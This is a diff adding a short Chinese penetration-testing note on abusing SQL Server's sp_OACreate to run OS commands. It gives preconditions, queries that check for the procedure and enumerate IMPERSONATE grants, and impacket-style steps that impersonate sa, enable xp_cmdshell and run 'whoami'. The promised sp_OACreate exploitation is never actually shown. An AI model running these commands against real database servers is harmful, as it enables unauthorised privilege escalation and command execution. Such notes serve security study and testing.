@@ -1,0 +1,44 @@
+
+
+
+系统存储过程(sp_OACreate)
+
+概念
+
+sp_OACreate 创建 OLE 对象实例。
+–>第一个参数为 OLE 对象的程序标识符（ProgID）或类标识符（CLSID）。
+–>第二个参数为返回的对象令牌，必须是数据类型为 int 的局部变量，在后面的方法中都要用到对象令牌。输出参数，必须加 OUT 或 OUTPUT。
+
+当xp_cmdshell无法使用时，我们也可以通过sp_OACreate来创建OLE对象实例，然后利用sp_oamethod(sp_oamethod是调用一个 OLE 对象的方法)达到一个执行命令的效果。
+
+补充
+
+以sp_开头，进行系统的设定为系统存储过程。如：sp_oacreate、sp_oamethod
+
+利用条件
+
+同上，即
+
+1 、SQL Server数据库没有被降权；
+2、 sa用户或其他具有dba权限的账户。
+
+具体利用
+
+首先判断一下sp_OACreate是否存在
+
+select count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'
+impacket sqlserver
+SELECT distinct b.name
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b
+ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE'
+
+
+
+enum_links
+use_link "xxxx"
+enum_impersonate
+exec_as_login sa
+enable_xp_cmdshell
+xp_cmdshell whoami
